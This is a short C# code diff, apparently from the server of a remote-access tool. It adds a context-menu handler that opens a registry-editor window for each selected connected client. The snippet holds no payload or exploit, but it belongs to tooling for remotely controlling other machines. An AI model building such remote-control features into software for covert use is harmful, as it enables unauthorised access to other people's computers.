@@ -544,7 +544,20 @@ namespace xServer.Forms
 
         private void ctxtRegistryEditor_Click(object sender, EventArgs e)
         {
-            // TODO
+            if (lstClients.SelectedItems.Count != 0)
+            {
+                foreach (Client c in GetSelectedClients())
+                {
+                    if (c.Value.FrmRe != null)
+                    {
+                        c.Value.FrmRe.Focus();
+                        return;
+                    }
+
+                    FrmRegistryEditor frmRE = new FrmRegistryEditor(c);
+                    frmRE.Show();
+                }
+            }
         }
 
         private void ctxtShutdown_Click(object sender, EventArgs e)
